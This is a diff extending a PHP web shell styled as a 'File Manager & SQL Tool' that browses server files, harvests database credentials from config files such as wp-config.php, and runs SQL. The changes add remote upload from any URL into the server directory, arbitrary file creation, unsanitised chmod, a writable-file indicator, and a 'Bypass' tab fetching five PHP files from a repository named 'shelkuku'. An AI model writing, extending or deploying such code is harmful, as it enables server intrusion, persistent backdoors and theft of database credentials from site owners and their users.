@@ -41,6 +41,45 @@ $dir = realpath($dir);
 
 $msg = '';
 
+// Output untuk mode bypass
+$bypass_output = '';
+
+// === UPLOAD FROM URL ===
+if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
+    $url = trim($_POST['upload_url']);
+    $basename = basename(parse_url($url, PHP_URL_PATH));
+    $output_name = isset($_POST['output_name']) && $_POST['output_name'] !== '' ? basename($_POST['output_name']) : $basename;
+    if ($output_name === '' || $output_name === '.' || $output_name === '..') {
+        $msg = "URL tidak valid atau nama file output tidak ditemukan!";
+    } else {
+        $target = $dir . "/" . $output_name;
+        $data = @file_get_contents($url);
+        if ($data === false) {
+            $msg = "Gagal download dari URL!";
+        } else {
+            $w = @file_put_contents($target, $data);
+            if ($w === false) {
+                $msg = "Gagal simpan file dari URL!";
+            } else {
+                $msg = "Upload dari URL berhasil: " . htmlspecialchars($output_name);
+            }
+        }
+    }
+}
+
+// === BYPASS BUTTONS HANDLER ===
+if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
+    $url = trim($_POST['bypass_url']);
+    if ($url !== '') {
+        $data = @file_get_contents($url);
+        if ($data === false) {
+            $bypass_output = "Gagal mengambil konten dari URL: " . htmlspecialchars($url);
+        } else {
+            $bypass_output = $data; // tidak dieksekusi, hanya ditampilkan
+        }
+    }
+}
+
 // === CREATE ===
 if (!empty($_FILES['file']['name'])) {
     $target = $dir . "/" . basename($_FILES['file']['name']);
@@ -55,6 +94,27 @@ if (isset($_POST['newfolder']) && $_POST['newfolder'] !== '') {
     if (!file_exists($newFolder)) {
         mkdir($newFolder);
         $msg = "Folder berhasil dibuat!";
+    }
+}
+
+// Create file
+if (isset($_POST['newfile']) && $_POST['newfile'] !== '') {
+    $newFileName = basename($_POST['newfile']);
+    if ($newFileName === '' || $newFileName === '.' || $newFileName === '..') {
+        $msg = "Nama file tidak valid!";
+    } else {
+        $newFilePath = $dir . DIRECTORY_SEPARATOR . $newFileName;
+        if (file_exists($newFilePath)) {
+            $msg = "File sudah ada!";
+        } else {
+            $initial = isset($_POST['newfile_content']) ? (string)$_POST['newfile_content'] : '';
+            $w = @file_put_contents($newFilePath, $initial);
+            if ($w === false) {
+                $msg = "Gagal membuat file!";
+            } else {
+                $msg = "File berhasil dibuat!";
+            }
+        }
     }
 }
 
@@ -89,6 +149,17 @@ if (isset($_POST['delete'])) {
         } else {
             $msg = "Gagal hapus file!";
         }
+    }
+}
+
+// === CHMOD ===
+if (isset($_POST['chmod_target']) && isset($_POST['chmod_value'])) {
+    $target = $dir . DIRECTORY_SEPARATOR . $_POST['chmod_target'];
+    $perm = $_POST['chmod_value'];
+    if (@chmod($target, octdec($perm))) {
+        $msg = "Chmod $perm ke " . htmlspecialchars($_POST['chmod_target']) . " sukses!";
+    } else {
+        $msg = "Gagal chmod $perm ke " . htmlspecialchars($_POST['chmod_target']);
     }
 }
 
@@ -154,43 +225,40 @@ function scan_configs($root, $maxFiles=2000, $maxBytes=262144) {
     $items = array();
     $count = 0;
 
-    // PHP 5 compatible directory scanning
-    $rii = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($root),
-        RecursiveIteratorIterator::LEAVES_ONLY
-    );
-
-    foreach ($rii as $file) {
-        if ($count >= $maxFiles) break;
-        if (!$file->isFile()) continue;
-        $path = $file->getRealPath();
-        $base = basename($path);
-
-        // Manual skip for . and ..
-        if ($base === '.' || $base === '..') continue;
-
-        if (@filesize($path) > $maxBytes) continue;
-
-        // skip dirs tertentu
-        $rel = str_replace($root.DIRECTORY_SEPARATOR, '', $path);
-        $parts = explode(DIRECTORY_SEPARATOR, $rel);
-        $skip = false;
-        foreach ($parts as $seg) {
-            if (in_array($seg, $skipDirs, true)) {
-                $skip = true;
-                break;
+    // Safe manual traversal to avoid exceptions on unreadable directories
+    $stack = array($root);
+    while (!empty($stack) && $count < $maxFiles) {
+        $dirPath = array_pop($stack);
+        if (!@is_readable($dirPath) || !@is_executable($dirPath)) continue;
+        $entries = @scandir($dirPath);
+        if ($entries === false) continue;
+        foreach ($entries as $entry) {
+            if ($count >= $maxFiles) break;
+            if ($entry === '.' || $entry === '..') continue;
+            $path = $dirPath . DIRECTORY_SEPARATOR . $entry;
+            if (@is_link($path)) continue;
+            if (@is_dir($path)) {
+                // Skip any directory segment that is in skipDirs
+                $rel = ltrim(str_replace($root, '', $path), DIRECTORY_SEPARATOR);
+                $skip = false;
+                if ($rel !== '') {
+                    $parts = explode(DIRECTORY_SEPARATOR, $rel);
+                    foreach ($parts as $seg) { if ($seg !== '' && in_array($seg, $skipDirs, true)) { $skip = true; break; } }
+                }
+                if ($skip) continue;
+                $stack[] = $path;
+                continue;
             }
-        }
-        if ($skip) continue;
+            if (!@is_file($path)) continue;
+            if (@filesize($path) > $maxBytes) continue;
+            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+            if ($ext !== '' && !in_array($ext, $extAllow, true)) continue;
+            $src = @file_get_contents($path);
+            if ($src === false) continue;
+            $count++;
 
-        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-        if ($ext !== '' && !in_array($ext, $extAllow, true)) continue;
-
-        $src = @file_get_contents($path);
-        if ($src === false) continue;
-        $count++;
-
-                $found = array('file'=>$path,'host'=>null,'user'=>null,'pass'=>null,'db'=>null,'hint'=>null);
+            $base = basename($path);
+            $found = array('file'=>$path,'host'=>null,'user'=>null,'pass'=>null,'db'=>null,'hint'=>null);
 
         // WordPress wp-config.php
         if (stripos($base,'wp-config.php') !== false || strpos($src,"'DB_NAME'") !== false || strpos($src,'"DB_NAME"') !== false) {
@@ -259,6 +327,8 @@ function scan_configs($root, $maxFiles=2000, $maxBytes=262144) {
                 continue;
             }
         }
+    }
+    
     }
 
     // de-duplicate by (host|user|db) + file
@@ -680,24 +750,10 @@ if (!$disabled_funcs) {
 <head>
     <title>File Manager & SQL Tool</title>
     <style>
-        /* Simple Dark Theme */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;
-            background: #0b0f14; /* deep dark */
-            color: #dbe7ff;
-            min-height: 100vh;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-
-        .container { max-width: 1100px; margin: 24px auto; padding: 18px; }
-
-        .header {
-            display:flex; align-items:center; justify-content:space-between;
-            padding:14px 18px; border-radius:10px; background:#071018; border:1px solid rgba(255,255,255,0.03);
-            margin-bottom:16px;
-        }
+        /* Base */
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; background:#0b0f14; margin:0; }
+        .container { max-width:1100px; margin:0 auto; padding:16px; }
+        .header { display:flex; align-items:center; justify-content:space-between; padding:14px 18px; border-radius:10px; background:#071018; border:1px solid rgba(255,255,255,0.03); margin-bottom:16px; }
         .header h1 { font-size:1.4rem; font-weight:600; color:#e6eef8; }
 
         .nav-tabs { display:flex; gap:8px; margin-bottom:16px; }
@@ -744,8 +800,12 @@ if (!$disabled_funcs) {
         .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:14px; }
         .stats { display:flex; gap:12px; margin-bottom:12px; flex-wrap:wrap; }
         .stat-card { background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01)); padding:12px; border-radius:10px; flex:1; min-width:160px; border:1px solid rgba(255,255,255,0.02); }
-        .stat-number { font-size:1.5rem; font-weight:700; color:#dff0ff; }
-        .stat-label { color:#9fb7d8; font-size:0.8rem; text-transform:uppercase; }
+    .stat-number { font-size:1.5rem; font-weight:700; color:#dff0ff; }
+    .stat-label { color:#9fb7d8; font-size:0.8rem; text-transform:uppercase; }
+
+    /* JS-free edit row toggler */
+    .edit-row { display:none; }
+    .edit-row:target { display:block; }
 
         @media (max-width:768px) {
             .container { padding:12px; }
@@ -754,8 +814,8 @@ if (!$disabled_funcs) {
             .table th, .table td { padding:8px 10px; font-size:0.9rem; }
         }
     </style>
-</head>
-<body>
+    </head>
+    <body>
 <div class="container">
     <div class="header">
         <h1>File Manager & SQL Tool</h1>
@@ -767,6 +827,7 @@ if (!$disabled_funcs) {
         <a href="?mode=files" class="nav-tab <?php echo $mode === 'files' ? 'active' : ''; ?>">📁 File Manager</a>
         <a href="?mode=sql" class="nav-tab <?php echo $mode === 'sql' ? 'active' : ''; ?>">🗄️ SQL Manager</a>
         <a href="?mode=scan" class="nav-tab <?php echo $mode === 'scan' ? 'active' : ''; ?>">🔍 DB Scanner</a>
+    <a href="?mode=bypass" class="nav-tab <?php echo $mode === 'bypass' ? 'active' : ''; ?>">🚧 Bypass</a>
     </div>
 
 <!-- Server Info -->
@@ -886,6 +947,15 @@ if (!$disabled_funcs) {
                     </div>
                     <button type="submit" class="btn btn-success">🚀 Upload File</button>
                 </form>
+                <form method="POST" style="margin-top:12px;">
+                    <div class="form-group">
+                        <input type="text" name="upload_url" class="form-control" placeholder="Paste file URL here...">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" name="output_name" class="form-control" placeholder="Output filename (optional)">
+                    </div>
+                    <button type="submit" class="btn btn-success">🌐 Upload from URL</button>
+                </form>
             </div>
 
             <div class="card">
@@ -897,7 +967,20 @@ if (!$disabled_funcs) {
                     <button type="submit" class="btn btn-success">✨ Create Folder</button>
                 </form>
             </div>
-            
+
+            <div class="card">
+                <h3>Create File</h3>
+                <form method="POST">
+                    <div class="form-group">
+                        <input type="text" name="newfile" placeholder="Enter file name..." class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <textarea name="newfile_content" class="form-control" placeholder="Optional initial content" style="min-height: 80px;"></textarea>
+                    </div>
+                    <button type="submit" class="btn btn-success">📝 Create File</button>
+                </form>
+            </div>
+
             <div class="card">
                 <h3>Create .htaccess</h3>
                 <p style="color:#9fb7d8;">Generate a basic .htaccess to deny access to common script/file extensions. You can add comma-separated exclude patterns (eg. index.php, sitemap.xml, *.css).</p>
@@ -922,13 +1005,16 @@ if (!$disabled_funcs) {
         <div class="card">
             <h3>Directory Contents</h3>
             <?php if (is_dir($dir)): ?>
+                <?php echo '<div style="color:#ff0;background:#222;padding:4px 8px;">DEBUG: Directory = '.htmlspecialchars($dir).'</div>'; ?>
                 <table class="table">
                     <thead>
                         <tr>
+                <?php echo '<div style="color:#ff0;background:#222;padding:4px 8px;">DEBUG: End of file list</div>'; ?>
                             <th>Name</th>
                             <th>Type</th>
                             <th>Size</th>
                             <th>Actions</th>
+                            <th>Status/Chmod</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -951,47 +1037,84 @@ if (!$disabled_funcs) {
 
                         foreach ($page_files as $f):
                             $path = $dir . DIRECTORY_SEPARATOR . $f;
-                        ?>
-                            <tr>
-                                <?php if ($f === '..'): ?>
-                                    <td><a href="?dir=<?php echo urlencode(dirname($dir)); ?>" style="color: #667eea;">[..] Parent Directory</a></td>
-                                    <td>📁</td>
-                                    <td>-</td>
-                                    <td>-</td>
-                                <?php elseif (is_dir($path)): ?>
-                                    <td><a href="?dir=<?php echo urlencode($path); ?>" style="color: #667eea;">📁 <?php echo htmlspecialchars($f); ?></a></td>
-                                    <td>Folder</td>
-                                    <td>-</td>
-                                    <td>
-                                        <form method="POST" style="display: inline;">
-                                            <input type="hidden" name="delete" value="<?php echo htmlspecialchars($f); ?>">
-                                            <button type="submit" class="btn btn-danger" onclick="return confirm('Delete folder?')">Delete</button>
-                                        </form>
-                                        <form method="POST" style="display: inline; margin-left: 5px;">
-                                            <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
-                                            <input type="text" name="rename" placeholder="New name" style="padding: 5px; border-radius: 4px; border: 1px solid #ccc;">
-                                            <button type="submit" class="btn">Rename</button>
-                                        </form>
-                                    </td>
-                                <?php else: ?>
-                                    <td><a href="?dir=<?php echo urlencode($dir); ?>&view=<?php echo urlencode($f); ?>" style="color: #667eea;">📄 <?php echo htmlspecialchars($f); ?></a></td>
-                                    <td>File</td>
-                                    <td><?php echo filesize($path); ?> bytes</td>
-                                    <td>
-                                        <form method="POST" style="display: inline;">
-                                            <input type="hidden" name="delete" value="<?php echo htmlspecialchars($f); ?>">
-                                            <button type="submit" class="btn btn-danger" onclick="return confirm('Delete file?')">Delete</button>
-                                        </form>
-                                        <form method="POST" style="display: inline; margin-left: 5px;">
-                                            <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
-                                            <input type="text" name="rename" placeholder="New name" style="padding: 5px; border-radius: 4px; border: 1px solid #ccc;">
-                                            <button type="submit" class="btn">Rename</button>
-                                        </form>
-                                        <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($f); ?>" class="btn" style="margin-left: 5px;">Edit</a>
-                                    </td>
-                                <?php endif; ?>
-                            </tr>
-                        <?php endforeach; ?>
+                            ?>
+                                <tr>
+                                    <?php
+                                    // Get permission
+                                    $perm = @fileperms($path);
+                                    $permstr = $perm !== false ? substr(sprintf('%o', $perm), -4) : '----';
+                                    $isWritable = is_writable($path);
+                                    $isReadable = is_readable($path);
+                                    // Status color logic
+                                    $status = 'white';
+                                    $statusText = 'Normal';
+                                    if ($permstr === '777' || $permstr === '666') {
+                                        $status = 'green'; $statusText = 'Writable';
+                                    } elseif ($permstr === '000' || !$isReadable) {
+                                        $status = 'red'; $statusText = 'No Access';
+                                    } elseif ($permstr === '400' || !$isWritable) {
+                                        $status = 'red'; $statusText = 'Read Only';
+                                    }
+                                    $color = $status === 'green' ? '#10b981' : ($status === 'red' ? '#ef4444' : '#dbe7ff');
+                                    ?>
+                                    <?php if ($f === '..'): ?>
+                                        <td><a href="?dir=<?php echo urlencode(dirname($dir)); ?>" style="color: #667eea;">[..] Parent Directory</a></td>
+                                        <td>📁</td>
+                                        <td>-</td>
+                                        <td>-</td>
+                                        <td>-</td>
+                                    <?php elseif (is_dir($path)): ?>
+                                        <td><a href="?dir=<?php echo urlencode($path); ?>" style="color: #667eea;">📁 <?php echo htmlspecialchars($f); ?></a></td>
+                                        <td>Folder</td>
+                                        <td>-</td>
+                                        <td>
+                                            <form method="POST" style="display: inline;">
+                                                <input type="hidden" name="delete" value="<?php echo htmlspecialchars($f); ?>">
+                                                <button type="submit" class="btn btn-danger" onclick="return confirm('Delete folder?')">Delete</button>
+                                            </form>
+                                            <form method="POST" style="display: inline; margin-left: 5px;">
+                                                <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
+                                                <input type="text" name="rename" placeholder="New name" style="padding: 5px; border-radius: 4px; border: 1px solid #ccc;">
+                                                <button type="submit" class="btn">Rename</button>
+                                            </form>
+                                        </td>
+                                        <td style="color:<?php echo $color; ?>;font-weight:bold;">
+                                            <?php echo $permstr; ?>
+                                            <span style="margin-left:6px;">● <?php echo $statusText; ?></span>
+                                            <form method="POST" style="display:inline; margin-left:8px;">
+                                                <input type="hidden" name="chmod_target" value="<?php echo htmlspecialchars($f); ?>">
+                                                <input type="text" name="chmod_value" value="<?php echo $permstr; ?>" style="width:50px;">
+                                                <button type="submit" class="btn btn-success" style="padding:2px 8px;">Chmod</button>
+                                            </form>
+                                        </td>
+                                    <?php else: ?>
+                                        <td><a href="?dir=<?php echo urlencode($dir); ?>&view=<?php echo urlencode($f); ?>" style="color: #667eea;">📄 <?php echo htmlspecialchars($f); ?></a></td>
+                                        <td>File</td>
+                                        <td><?php echo filesize($path); ?> bytes</td>
+                                        <td>
+                                            <form method="POST" style="display: inline;">
+                                                <input type="hidden" name="delete" value="<?php echo htmlspecialchars($f); ?>">
+                                                <button type="submit" class="btn btn-danger" onclick="return confirm('Delete file?')">Delete</button>
+                                            </form>
+                                            <form method="POST" style="display: inline; margin-left: 5px;">
+                                                <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
+                                                <input type="text" name="rename" placeholder="New name" style="padding: 5px; border-radius: 4px; border: 1px solid #ccc;">
+                                                <button type="submit" class="btn">Rename</button>
+                                            </form>
+                                            <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($f); ?>" class="btn" style="margin-left: 5px;">Edit</a>
+                                        </td>
+                                        <td style="color:<?php echo $color; ?>;font-weight:bold;">
+                                            <?php echo $permstr; ?>
+                                            <span style="margin-left:6px;">● <?php echo $statusText; ?></span>
+                                            <form method="POST" style="display:inline; margin-left:8px;">
+                                                <input type="hidden" name="chmod_target" value="<?php echo htmlspecialchars($f); ?>">
+                                                <input type="text" name="chmod_value" value="<?php echo $permstr; ?>" style="width:50px;">
+                                                <button type="submit" class="btn btn-success" style="padding:2px 8px;">Chmod</button>
+                                            </form>
+                                        </td>
+                                    <?php endif; ?>
+                                </tr>
+                            <?php endforeach; ?>
                     </tbody>
                 </table>
 
@@ -1023,7 +1146,7 @@ if (!$disabled_funcs) {
             ?>
                 <div class="card">
                     <h3>View File: <?php echo htmlspecialchars($_GET['view']); ?></h3>
-                    <pre style="background: #f8f9fa; padding: 15px; border-radius: 8px; overflow: auto;"><?php echo htmlspecialchars(file_get_contents($file)); ?></pre>
+                    <pre style="background:#041022; color:#e6eef8; padding:15px; border-radius:8px; overflow:auto; border:1px solid rgba(255,255,255,0.05); white-space:pre-wrap; word-break:break-word; font-family:monospace;"><?php echo htmlspecialchars(file_get_contents($file)); ?></pre>
                 </div>
             <?php endif; ?>
         <?php endif; ?>
@@ -1357,11 +1480,12 @@ if (!$disabled_funcs) {
                                                                     <form method="POST" style="display:inline;">
                                                                         <input type="hidden" name="pk" value="<?php echo htmlspecialchars($pk_ser); ?>">
                                                                         <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_current_table); ?>">
-                                                                        <button type="button" class="btn" onclick="toggleEdit(this)">Edit</button>
+                                                                        <?php $rowId = substr(md5($pk_ser.$db_current_table),0,8); ?>
+                                                                        <a href="#edit-<?php echo $rowId; ?>" class="btn">Edit</a>
                                                                         <button type="submit" name="delete_row" class="btn btn-danger" onclick="return confirm('Delete this row?')">Delete</button>
                                                                         <button type="submit" name="duplicate_row" class="btn" style="margin-left:6px;">Duplicate</button>
                                                                     </form>
-                                                                    <div class="edit-row" style="display:none; margin-top:8px;">
+                                                                    <div id="edit-<?php echo $rowId; ?>" class="edit-row" style="margin-top:8px;">
                                                                         <form method="POST">
                                                                             <input type="hidden" name="pk" value="<?php echo htmlspecialchars($pk_ser); ?>">
                                                                             <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_current_table); ?>">
@@ -1370,7 +1494,10 @@ if (!$disabled_funcs) {
                                                                                 <div style="margin-bottom:6px;"><label style="display:block; font-size:0.9rem; color:#9fb7d8;"><?php echo htmlspecialchars($c); ?></label>
                                                                                     <input type="text" name="fields[<?php echo htmlspecialchars($c); ?>]" value="<?php echo htmlspecialchars(isset($row[$c]) ? $row[$c] : ''); ?>" class="form-control"></div>
                                                                             <?php endforeach; ?>
-                                                                            <button type="submit" class="btn btn-success">Save</button>
+                                                                            <div style="display:flex; gap:10px;">
+                                                                                <button type="submit" class="btn btn-success">Save</button>
+                                                                                <a href="#" class="btn">Cancel</a>
+                                                                            </div>
                                                                         </form>
                                                                     </div>
                                                                 </td>
@@ -1471,6 +1598,34 @@ if (!$disabled_funcs) {
                 <?php endif; ?>
             </div>
         <?php endif; ?>
+    <?php elseif ($mode === 'bypass'): ?>
+        <div class="card">
+            <h3>Bypass Loader</h3>
+            <p style="color:#9fb7d8;">Klik salah satu tombol di bawah untuk mengambil konten dari URL terkait. Hanya ditampilkan sebagai teks (tidak dieksekusi).</p>
+            <?php
+                $bypass_links = array(
+                    '1' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/1.php',
+                    '2' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/2.php',
+                    '3' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/3.php',
+                    '4' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/4.php',
+                    '5' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/5.php',
+                );
+            ?>
+            <div style="display:flex;flex-wrap:wrap;gap:10px;margin-bottom:14px;">
+                <?php foreach ($bypass_links as $k=>$v): ?>
+                    <form method="POST" style="display:inline;">
+                        <input type="hidden" name="bypass_url" value="<?php echo htmlspecialchars($v); ?>">
+                        <button type="submit" name="bypass_fetch" class="btn">Bypass <?php echo htmlspecialchars($k); ?></button>
+                    </form>
+                <?php endforeach; ?>
+            </div>
+            <div class="form-group">
+                <label style="display:block;margin-bottom:6px;color:#a9c0e8;font-weight:600;">Output</label>
+                <textarea readonly style="width:100%;min-height:260px;background:#041022;color:#e6eef8;border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:12px;font-family:monospace;white-space:pre;overflow:auto;">
+<?php echo htmlspecialchars($bypass_output); ?>
+                </textarea>
+            </div>
+        </div>
     <?php endif; ?>
 </div>
 </body>
@@ -1489,4 +1644,5 @@ function toggleEdit(btn) {
     }
 }
 </script>
+<!-- No JS needed for modals; using CSS :target -->
 </html>
